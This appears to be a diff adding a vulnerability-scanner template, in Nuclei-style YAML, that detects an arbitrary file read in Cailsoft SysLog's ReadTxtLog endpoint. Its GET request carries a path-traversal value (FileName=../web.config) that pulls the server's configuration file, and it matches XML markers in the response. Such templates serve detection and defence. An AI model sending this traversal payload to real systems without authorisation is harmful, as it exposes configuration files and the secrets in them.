@@ -1,0 +1,22 @@
+id: poc-yaml-cailsoft-syslog-readtxtlog-any-fileread
+info:
+  name: Cailsoft SysLog ReadTxtLog Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/BaseModule/SysLog/ReadTxtLog?FileName=../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<configuration>"
+          - "<?xml version="
+          - "<configSections>"
+          - "system.webServer"
+        part: body
